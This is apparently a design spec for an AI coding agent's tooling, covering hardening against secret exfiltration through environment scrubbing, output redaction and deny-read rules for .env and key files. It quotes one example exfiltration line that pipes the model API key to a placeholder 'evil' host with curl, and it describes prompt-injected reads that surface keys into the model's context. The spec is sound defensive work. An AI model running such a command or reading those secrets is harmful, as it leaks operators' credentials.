# 0078 — secret-exfil hardening (env-scrub + output-scrub + deny-read)

Status: implemented
Flag: `CODE_ENV_SCRUB` / `CODE_SCRUB_OUTPUT` / `CODE_SECRET_DENY_READ` (all default off)

## Goal

Close the highest-EV hole a Codex-vs-OAC security review found: **secrets are freely exfiltrable**. This is
Phase 1 of adopting Codex's security posture, adapted to OAC's Python/Windows reality — the quick-wins that
remove the exfiltration PATH itself, no OS primitive required.

Three concrete leaks, all closed here:

- `run_command` spawned its child with no `env=`, so every child inherited the FULL `os.environ` — `CODE_API_KEY`
  (the model key) and everything `load_dotenv()` pulled from `.env`. `echo $env:CODE_API_KEY | curl evil` leaks
  it in one line.
- `.env` / key files inside the workspace were fully READABLE by `read_file` / `grep` — a prompt-injected read
  surfaces the key straight into the model context.
- Even a command that just PRINTS a secret (an env dump, a leaked token) returned it to the model verbatim —
  `scrub.py` only ran at the trajectory write choke point (persisted corpus), never on live output.

## The three fixes

- **Env-scrub** (`src/envscrub.py`, `CODE_ENV_SCRUB`). `child_env()` builds a minimal allowlisted env for a
  `run_command` child: a small set of vars a shell/toolchain needs (PATH, SystemRoot, TEMP, …) plus an operator
  `CODE_ENV_PASSLIST`, with every `CODE_*` and secret-shaped var (`*api_key*`/`*secret*`/`*token*`/`*password*`/
  `aws_`/`openai_`/…) dropped. `run_command` spawns with `env=that`; off → `child_env()` returns `None` and the
  child inherits the env exactly as before (byte-identical). Removes the exfil PAYLOAD — the single biggest win.
- **Deny-read** (`src/config.is_secret_path` + `permissions.py` + `tools.py`, `CODE_SECRET_DENY_READ`). A
  designated secret file (`.env`, `.env.*`, `*.pem`, `*.key`, `id_rsa`, … — `CODE_SECRET_PATH_GLOBS`) is: DENIED
  to `read_file` at the permission gate (before the read-only allow); SKIPPED by `grep` in its walk (never
  surfaces the file's CONTENT) and directly (`grep .env` → no matches); and omitted from `glob`/`tree` listings
  (its NAME doesn't leak either).
- **Output-scrub** (`tools.py`, `CODE_SCRUB_OUTPUT`). `run_command` stdout/stderr is passed through
  `scrub.scrub_text()` before it becomes a surfaced `ToolResult`, so a command that echoes a secret has it
  redacted before the model sees it. Reuses the specs/0059 patterns.

## Acceptance

`scripts/check_security_0078.py` (11/11, dep-free):

- env-scrub drops `CODE_*` + secret-shaped vars, keeps the allowlist, honors `CODE_ENV_PASSLIST`, returns
  `None` when off; `is_secret_path` matches `.env`/`*.pem`/`id_rsa` and not a source file; `read_file(.env)` is
  denied while `read_file(app.py)` is allowed; `grep`/`glob`/`tree` don't surface `.env` content or name; with
  the flag off everything is readable again (byte-identical); `scrub_text` redacts a key in output.

## Non-goals

- This does NOT confine a child that reads a secret via its own syscalls or reaches the network — that needs an
  OS sandbox (the deferred `CODE_WIN_SANDBOX`, Phase 3) and the net-fence (Phase 2). This is the tool/env layer.
- The env allowlist is intentionally conservative; an operator whose toolchain needs an extra var adds it via
  `CODE_ENV_PASSLIST` (a `CODE_*` var can never be re-admitted).

## Byte-identity

With all three flags off: `child_env()` returns `None` (inherit as before), the deny-read gate and the
grep/glob/tree skips never run, and output is unscrubbed — byte-for-byte the prior behavior. Verified: full
dep-free suite 60/60.
